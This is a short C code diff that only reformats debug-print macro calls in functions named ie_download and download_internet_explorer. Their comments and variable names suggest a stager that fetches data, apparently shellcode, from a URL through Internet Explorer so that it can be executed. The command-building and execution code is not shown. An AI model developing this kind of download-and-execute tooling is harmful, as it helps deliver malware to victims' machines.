@@ -28,7 +28,7 @@ char* ie_download(char* string) {
 		ptr = strtok(NULL, delimiter);
 	}
 
-	DEBUG_PRINT(("ie_download, filename: %s\n", fname));
+	DEBUG_PRINT("ie_download, filename: %s\n", fname);
 	
 	// split the filename
 	char delimiter2[] = ".";
@@ -37,7 +37,7 @@ char* ie_download(char* string) {
 	sname = ptr;
 	ptr = strtok(NULL, delimiter2);
 
-	DEBUG_PRINT(("ie_download, name to search for: %s\n", sname));
+	DEBUG_PRINT("ie_download, name to search for: %s\n", sname);
 	
 	// search for the file in user profile
 
@@ -58,7 +58,7 @@ char* ie_download(char* string) {
 	strcat (searchstring,tmp_home);
 	strcat (searchstring,"\\datafile.txt\"");
 	
-	DEBUG_PRINT(("ie_download, searchstring: %s\n", searchstring));
+	DEBUG_PRINT("ie_download, searchstring: %s\n", searchstring);
 	
 	// build & execute cmd
 	char cmd[500];
@@ -84,7 +84,7 @@ char* ie_download(char* string) {
 	// there is always emtpy space at the end of the file -> delete that
 	sh_filename[size_sh_filename-2]=0x0;
 	
-	DEBUG_PRINT(("ie_download, sh_filename: >>>%s<<<, size: %d\ntest\n", sh_filename, size_sh_filename));
+	DEBUG_PRINT("ie_download, sh_filename: >>>%s<<<, size: %d\ntest\n", sh_filename, size_sh_filename);
 	
 	return sh_filename;
 }
@@ -95,8 +95,8 @@ char* ie_download(char* string) {
 // arg1 specifies the URL to download the file from.
 // data_size receives the size of the data in bytes.
 unsigned char* download_internet_explorer(char *arg1, int *data_size) {
-    DEBUG_PRINT(("This is download_internet_explorer.\n"));
-	DEBUG_PRINT(("exec data from url\n"));
+    DEBUG_PRINT("This is download_internet_explorer.\n");
+	DEBUG_PRINT("exec data from url\n");
 		
 	char *sh_filename = ie_download(arg1);
 	*data_size = get_filesize(sh_filename);	
